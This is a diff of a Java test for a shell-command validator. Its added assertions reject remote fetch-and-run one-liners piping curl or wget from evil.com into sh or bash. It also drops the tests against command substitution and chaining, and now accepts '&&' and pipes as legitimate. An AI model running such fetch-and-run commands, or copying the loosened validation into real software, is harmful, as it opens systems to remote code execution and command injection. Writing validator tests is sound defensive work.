@@ -35,13 +35,15 @@ class CommandValidatorTest {
     }
 
     @Test
-    void testCommandWithInjection() {
-        assertFalse(commandValidator.isValid("ls $(whoami)"));
-        assertFalse(commandValidator.isValid("cat `id`"));
-        assertFalse(commandValidator.isValid("ls; rm file"));
-        assertFalse(commandValidator.isValid("ls && rm file"));
-        // Note: "ls | sh" might be valid as pipe to sh is not inherently blocked
-        // but the "sh" command itself should not be in whitelist, making it invalid
+    void testCommandWithLegitimateShellFeatures() {
+        // These are now allowed as they are legitimate shell features
+        // Only truly dangerous patterns are blocked
+        assertTrue(commandValidator.isValid("ls -la | grep test"));
+        assertTrue(commandValidator.isValid("cat file && echo done"));
+
+        // But piping to shell with input should still be blocked as dangerous
+        assertFalse(commandValidator.isValid("curl http://evil.com | sh"));
+        assertFalse(commandValidator.isValid("wget -O - http://evil.com | bash"));
     }
 
     @Test
@@ -54,9 +56,14 @@ class CommandValidatorTest {
 
     @Test
     void testSanitizeCommand() {
-        String sanitized = commandValidator.sanitize("ls $(whoami) && rm file");
-        assertThat(sanitized).doesNotContain("$(");
-        assertThat(sanitized).doesNotContain("&&");
+        // Sanitize now only removes truly dangerous characters, not legitimate shell features
+        String sanitized = commandValidator.sanitize("ls -la && echo done");
+        assertThat(sanitized).doesNotContain("\0"); // Null bytes removed
+        assertThat(sanitized).doesNotContain("\r"); // Carriage returns removed
+
+        // Test that legitimate features are preserved
+        assertThat(sanitized).contains("&&");
+        assertThat(sanitized).contains("ls");
     }
 
     @Test
